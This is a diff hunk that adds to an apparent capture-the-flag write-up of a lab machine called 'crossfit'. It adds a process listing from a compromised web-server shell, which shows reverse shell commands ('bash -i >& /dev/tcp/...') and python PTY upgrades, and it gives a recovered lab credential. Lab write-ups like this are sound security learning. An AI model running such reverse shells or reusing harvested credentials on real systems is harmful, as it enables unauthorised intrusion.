@@ -838,6 +838,30 @@ www-data@crossfit:/$ export TERM=xterm-256color
 
 And got a shell back on my waiting netcat listener!  The first thing I did was upgrade to a full PTY using Python.  used bash because zsh problem
 
+```text
+www-data@crossfit:/run$ ps aux
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+www-data  6266  0.0  0.0  10748  1204 pts/3    R+   22:56   0:00 ps aux
+www-data 15839  0.0  0.2  17056  8284 ?        S    22:52   0:00 python3 -c import pty;pty.spawn("/bin/b
+www-data 15866  0.0  0.0   7192  3476 pts/3    Ss   22:52   0:00 /bin/bash
+www-data 17149  0.0  0.1  12216  7044 ?        S    17:35   0:00 python -c import pty;pty.spawn("/bin/ba
+www-data 17200  0.0  0.0   3868  3216 pts/2    Ss+  17:35   0:00 /bin/bash
+www-data 20099  0.0  0.0   2388   696 ?        S    22:51   0:00 sh -c uname -a; w; id; /bin/sh -i
+www-data 20109  0.0  0.0   2388   760 ?        S    22:51   0:00 /bin/sh -i
+www-data 21211  0.0  0.0   2388   760 ?        S    Mar20   0:00 sh -c bash -c 'bash -i >& /dev/tcp/10.1
+www-data 21212  0.0  0.0   3736  2800 ?        S    Mar20   0:00 bash -c bash -i >& /dev/tcp/10.10.14.24
+www-data 21213  0.0  0.0   3868  3244 ?        S    Mar20   0:00 bash -i
+www-data 21225  0.0  0.2  17056  8256 ?        S    Mar20   0:00 python3 -c import pty;pty.spawn("/bin/b
+www-data 21226  0.0  0.0   7060  3464 pts/0    Ss+  Mar20   0:00 /bin/bash
+www-data 32120  0.0  0.0   2388   752 ?        S    17:35   0:00 sh -c bash -c 'bash -i >& /dev/tcp/10.1
+www-data 32126  0.0  0.0   3736  2908 ?        S    17:35   0:00 bash -c bash -i >& /dev/tcp/10.10.14.22
+www-data 32128  0.0  0.0   3868  3220 ?        S    17:35   0:00 bash -i
+```
+
+Hmm...busy machine...Looked like I had company.
+
+
+
 enumerate a bit
 
 found `adduser-hank.yml` in `/ansible` directory with hash -&gt; `hank:powerpuffgirls`
